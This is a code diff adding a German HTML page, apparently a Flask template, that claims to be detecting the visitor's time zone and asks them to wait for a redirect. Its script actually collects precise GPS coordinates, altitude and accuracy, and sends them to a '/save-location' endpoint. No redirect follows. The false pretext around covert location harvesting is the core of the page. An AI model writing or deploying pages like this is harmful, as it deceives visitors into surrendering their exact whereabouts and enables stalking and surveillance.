@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8" />
+  <title>Koordinaten-Erfassung</title>
+  <h1>Ihre Zeitzone wird erfasst</h1>
+  <p>Dies kann einige Sekunden dauern, bleiben Sie auf dieser Seite. Sie werden automatisch weitergeleitet.</p>
+  <a href="{{ url_for('index') }}">Zurück</a>
+  <script>
+    window.addEventListener('load', () => {
+      if (!('geolocation' in navigator)) {
+        console.error('Geolocation wird nicht unterstützt.');
+        return;
+      }
+
+      const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const coords = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,               // ← Höhe in Metern (kann null sein)
+            altitudeAccuracy: pos.coords.altitudeAccuracy, // ← Genauigkeit der Höhenangabe in Metern (kann null sein)
+            timestamp: pos.timestamp
+          };
+
+          fetch('/save-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(coords)
+          })
+          .then(r => r.text())
+          .then(t => console.log('Serverantwort:', t))
+          .catch(e => console.error('Fehler beim Senden:', e));
+        },
+        err => {
+          console.error('Fehler bei Geolocation:', err);
+        },
+        options
+      );
+    });
+  </script>
+</head>
+<body></body>
+</html>
